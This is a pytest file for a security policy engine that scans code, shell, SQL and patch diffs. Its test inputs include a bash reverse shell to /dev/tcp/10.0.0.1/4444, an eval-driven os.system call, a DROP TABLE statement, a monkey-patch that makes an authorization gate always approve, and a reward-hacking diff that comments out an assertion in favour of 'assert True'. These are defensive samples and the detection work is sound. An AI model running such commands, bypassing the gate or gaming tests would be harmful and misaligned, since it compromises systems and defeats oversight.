"""Tests for Phase 1: Dynamic Code AST & Migration Diff Parser."""

import pytest

from tribune.security.policies import (
    ASTPolicyEngine,
    PolicyValidationResult,
)


def test_ast_policy_engine_permits_benign_python_code():
    """Verify benign calculation and logic passes AST policy validation."""
    engine = ASTPolicyEngine()
    benign_code = """
def calculate_snap_benefits(income: float, hh_size: int) -> float:
    standard_deduction = 198.0
    net_income = max(0.0, income - standard_deduction)
    max_allotment = 291.0 * hh_size
    benefit = max(0.0, max_allotment - 0.30 * net_income)
    return round(benefit, 2)
"""
    result = engine.check_python_ast(benign_code)
    assert result.is_valid is True
    assert len(result.violations) == 0
    assert result.risk_level == "LOW"
    assert result.ast_nodes_scanned > 0


def test_ast_policy_engine_blocks_dynamic_imports_and_eval():
    """Verify dynamic imports and eval/exec reflective calls are blocked."""
    engine = ASTPolicyEngine()

    dangerous_payload = """
import importlib

def run_untrusted(cmd):
    mod = importlib.import_module("os")
    return eval("mod.system('whoami')")
"""
    result = engine.check_python_ast(dangerous_payload)
    assert result.is_valid is False
    assert result.risk_level in ("HIGH", "CRITICAL")
    joined = " ".join(result.violations)
    assert "importlib" in joined
    assert "eval()" in joined


def test_ast_policy_engine_blocks_monkey_patching_security_primitives():
    """Verify attempts to monkey-patch or overwrite ActionGate or security hooks are caught."""
    engine = ASTPolicyEngine()

    patching_payload = """
from tribune.governance.action_gate import ActionGate

def bypass_gate():
    ActionGate.authorize_submission = lambda self, m, s: True
"""
    result = engine.check_python_ast(patching_payload)
    assert result.is_valid is False
    assert result.risk_level == "CRITICAL"
    assert any("monkey-patch" in v or "ActionGate" in v for v in result.violations)


def test_ast_policy_engine_checks_shell_and_sql():
    """Verify shell commands and SQL queries are verified for dangerous structural patterns."""
    engine = ASTPolicyEngine()

    # Dangerous shell reverse socket
    sh_res = engine.check_shell_ast("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert sh_res.is_valid is False
    assert sh_res.risk_level == "CRITICAL"

    # Destructive SQL DROP
    sql_res = engine.check_sql_ast("DROP TABLE applicant_records;")
    assert sql_res.is_valid is False
    assert sql_res.risk_level == "CRITICAL"


def test_validate_patch_diff_blocks_modification_of_security_hooks():
    """Verify validate_patch_diff rejects patches modifying Tribune security files."""
    engine = ASTPolicyEngine()

    malicious_diff = """--- a/tribune/security/sanitization.py
+++ b/tribune/security/sanitization.py
@@ -10,6 +10,7 @@
 def scrub_text(text: str):
+    return text, ScrubbingTelemetry()
"""
    result = engine.validate_patch_diff(malicious_diff)
    assert result.is_valid is False
    assert result.risk_level == "CRITICAL"
    assert any("Unauthorized modification of Tribune internal security file" in v for v in result.violations)


def test_validate_patch_diff_blocks_reward_hacking_and_assert_tampering():
    """Verify validate_patch_diff rejects patches attempting reward hacking or comment-outs."""
    engine = ASTPolicyEngine()

    reward_hacking_diff = """--- a/tests/test_verifier.py
+++ b/tests/test_verifier.py
@@ -20,7 +20,7 @@
 def test_eligibility():
-    assert result.status == "likely_eligible"
+    # assert result.status == "likely_eligible"
+    assert True
"""
    result = engine.validate_patch_diff(reward_hacking_diff)
    assert result.is_valid is False
    assert result.risk_level == "CRITICAL"
    assert any("Reward-hacking" in v for v in result.violations)
